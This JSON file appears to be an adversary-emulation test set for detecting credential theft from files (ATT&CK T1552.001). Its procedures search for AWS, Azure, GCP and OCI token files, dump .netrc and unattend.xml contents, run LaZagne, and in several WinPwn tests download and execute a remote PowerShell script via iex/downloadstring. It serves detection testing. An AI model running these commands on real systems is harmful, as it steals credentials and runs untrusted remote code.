{
  "attack_technique": "T1552.001",
  "display_name": "Unsecured Credentials: Credentials In Files",
  "atomic_tests": [
    {
      "name": "Find AWS credentials",
      "description": "Find local AWS credentials from file, defaults to using / as the look path.",
      "supported_platforms": [
        "macos",
        "linux"
      ],
      "executor": {
        "name": "sh",
        "elevation_required": false,
        "procedure": "find #{file_path}/.aws -name \"credentials\" -type f 2>/dev/null"
      },
      "input_arguments": [
        {
          "arg_name": "file_path",
          "description": "Path to search",
          "type": "string",
          "default": "/"
        }
      ],
      "auto_generated_guid": "37807632-d3da-442e-8c2e-00f44928ff8f"
    },
    {
      "name": "Extract Browser and System credentials with LaZagne",
      "description": "[LaZagne Source](https://github.com/AlessandroZ/LaZagne)",
      "supported_platforms": [
        "macos"
      ],
      "executor": {
        "name": "bash",
        "elevation_required": true,
        "procedure": "python2 laZagne.py all"
      },
      "input_arguments": [],
      "auto_generated_guid": "9e507bb8-1d30-4e3b-a49b-cb5727d7ea79"
    },
    {
      "name": "Extract passwords with grep",
      "description": "Extracting credentials from files",
      "supported_platforms": [
        "linux",
        "macos"
      ],
      "executor": {
        "name": "sh",
        "elevation_required": false,
        "procedure": "grep -ri password #{file_path}\nexit 0"
      },
      "input_arguments": [
        {
          "arg_name": "file_path",
          "description": "Path to search",
          "type": "string",
          "default": "/"
        }
      ],
      "auto_generated_guid": "bd4cf0d1-7646-474e-8610-78ccf5a097c4"
    },
    {
      "name": "Extracting passwords with findstr",
      "description": "Extracting Credentials from Files. Upon execution, the contents of files that contain the word \"password\" will be displayed.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "procedure": "findstr /si pass *.xml *.doc *.txt *.xls\nls -R | select-string -ErrorAction SilentlyContinue -Pattern password"
      },
      "input_arguments": [],
      "auto_generated_guid": "0e56bf29-ff49-4ea5-9af4-3b81283fd513"
    },
    {
      "name": "Access unattend.xml",
      "description": "Attempts to access unattend.xml, where credentials are commonly stored, within the Panther directory where installation logs are stored.\nIf these files exist, their contents will be displayed. They are used to store credentials/answers during the unattended windows install process.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "command_prompt",
        "elevation_required": true,
        "procedure": "type C:\\Windows\\Panther\\unattend.xml\ntype C:\\Windows\\Panther\\Unattend\\unattend.xml"
      },
      "input_arguments": [],
      "auto_generated_guid": "367d4004-5fc0-446d-823f-960c74ae52c3"
    },
    {
      "name": "Find and Access Github Credentials",
      "description": "This test looks for .netrc files (which stores github credentials in clear text )and dumps its contents if found.",
      "supported_platforms": [
        "linux",
        "macos"
      ],
      "executor": {
        "name": "bash",
        "elevation_required": false,
        "procedure": "for file in $(find #{file_path} -type f -name .netrc 2> /dev/null);do echo $file ; cat $file ; done"
      },
      "input_arguments": [
        {
          "arg_name": "file_path",
          "description": "Path to search",
          "type": "string",
          "default": "/home"
        }
      ],
      "auto_generated_guid": "da4f751a-020b-40d7-b9ff-d433b7799803"
    },
    {
      "name": "WinPwn - sensitivefiles",
      "description": "Search for sensitive files on this local system using the SensitiveFiles function of WinPwn",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "procedure": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsensitivefiles -noninteractive -consoleoutput"
      },
      "input_arguments": [],
      "auto_generated_guid": "114dd4e3-8d1c-4ea7-bb8d-8d8f6aca21f0"
    },
    {
      "name": "WinPwn - Snaffler",
      "description": "Check Domain Network-Shares for cleartext passwords using Snaffler function of WinPwn",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "procedure": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nSnaffler -noninteractive -consoleoutput"
      },
      "input_arguments": [],
      "auto_generated_guid": "fdd0c913-714b-4c13-b40f-1824d6c015f2"
    },
    {
      "name": "WinPwn - powershellsensitive",
      "description": "Check Powershell event logs for credentials or other sensitive information via winpwn powershellsensitive function.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "procedure": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npowershellsensitive -consoleoutput -noninteractive"
      },
      "input_arguments": [],
      "auto_generated_guid": "75f66e03-37d3-4704-9520-3210efbe33ce"
    },
    {
      "name": "WinPwn - passhunt",
      "description": "Search for Passwords on this system using passhunt via WinPwn",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "cleanup_command": "rm -force .\\passhunt.exe -ErrorAction Ignore\nrm -force .\\phunter* -ErrorAction Ignore\nrm -force -recurse .\\DomainRecon -ErrorAction Ignore\nrm -force -recurse .\\Exploitation -ErrorAction Ignore\nrm -force -recurse .\\LocalPrivEsc -ErrorAction Ignore\nrm -force -recurse .\\LocalRecon -ErrorAction Ignore\nrm -force -recurse .\\Vulnerabilities -ErrorAction Ignore",
        "procedure": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npasshunt -local $true -noninteractive"
      },
      "input_arguments": [],
      "auto_generated_guid": "00e3e3c7-6c3c-455e-bd4b-461c7f0e7797"
    },
    {
      "name": "WinPwn - SessionGopher",
      "description": "Launches SessionGopher on this system via WinPwn",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "procedure": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsessionGopher -noninteractive -consoleoutput"
      },
      "input_arguments": [],
      "auto_generated_guid": "c9dc9de3-f961-4284-bd2d-f959c9f9fda5"
    },
    {
      "name": "WinPwn - Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials",
      "description": "Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials technique via function of WinPwn",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": false,
        "procedure": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nSharpCloud -consoleoutput -noninteractive"
      },
      "input_arguments": [],
      "auto_generated_guid": "aaa87b0e-5232-4649-ae5c-f1724a4b2798"
    },
    {
      "name": "List Credential Files via PowerShell",
      "description": "Via PowerShell,list files where credentials are stored in Windows Credential Manager",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": true,
        "procedure": "$usernameinfo = (Get-ChildItem Env:USERNAME).Value\nGet-ChildItem -Hidden C:\\Users\\$usernameinfo\\AppData\\Roaming\\Microsoft\\Credentials\\\nGet-ChildItem -Hidden C:\\Users\\$usernameinfo\\AppData\\Local\\Microsoft\\Credentials\\"
      },
      "input_arguments": [],
      "auto_generated_guid": "0d4f2281-f720-4572-adc8-d5bb1618affe"
    },
    {
      "name": "List Credential Files via Command Prompt",
      "description": "Via Command Prompt,list files where credentials are stored in Windows Credential Manager",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "command_prompt",
        "elevation_required": true,
        "procedure": "dir /a:h C:\\Users\\%USERNAME%\\AppData\\Local\\Microsoft\\Credentials\\\ndir /a:h C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Credentials\\"
      },
      "input_arguments": [],
      "auto_generated_guid": "b0cdacf6-8949-4ffe-9274-a9643a788e55"
    },
    {
      "name": "Find Azure credentials",
      "description": "Find local Azure credentials from file, defaults to using / as the look path.",
      "supported_platforms": [
        "macos",
        "linux"
      ],
      "executor": {
        "name": "sh",
        "elevation_required": false,
        "procedure": "find #{file_path}/.azure -name \"msal_token_cache.json\" -o -name \"accessTokens.json\" -type f 2>/dev/null"
      },
      "input_arguments": [
        {
          "arg_name": "file_path",
          "description": "Path to search",
          "type": "string",
          "default": "/"
        }
      ],
      "auto_generated_guid": "a8f6148d-478a-4f43-bc62-5efee9f931a4"
    },
    {
      "name": "Find GCP credentials",
      "description": "Find local Google Cloud Platform credentials from file, defaults to using / as the look path.",
      "supported_platforms": [
        "macos",
        "linux"
      ],
      "executor": {
        "name": "sh",
        "elevation_required": false,
        "procedure": "find #{file_path}/.config/gcloud -name \"credentials.db\" -o -name \"access_tokens.db\" -type f 2>/dev/null"
      },
      "input_arguments": [
        {
          "arg_name": "file_path",
          "description": "Path to search",
          "type": "string",
          "default": "/"
        }
      ],
      "auto_generated_guid": "aa12eb29-2dbb-414e-8b20-33d34af93543"
    },
    {
      "name": "Find OCI credentials",
      "description": "Find local Oracle cloud credentials from file, defaults to using / as the look path.",
      "supported_platforms": [
        "macos",
        "linux"
      ],
      "executor": {
        "name": "sh",
        "elevation_required": false,
        "procedure": "find #{file_path}/.oci/sessions -name \"token\" -type f 2>/dev/null"
      },
      "input_arguments": [
        {
          "arg_name": "file_path",
          "description": "Path to search",
          "type": "string",
          "default": "/"
        }
      ],
      "auto_generated_guid": "9d9c22c9-fa97-4008-a204-478cf68c40af"
    }
  ]
}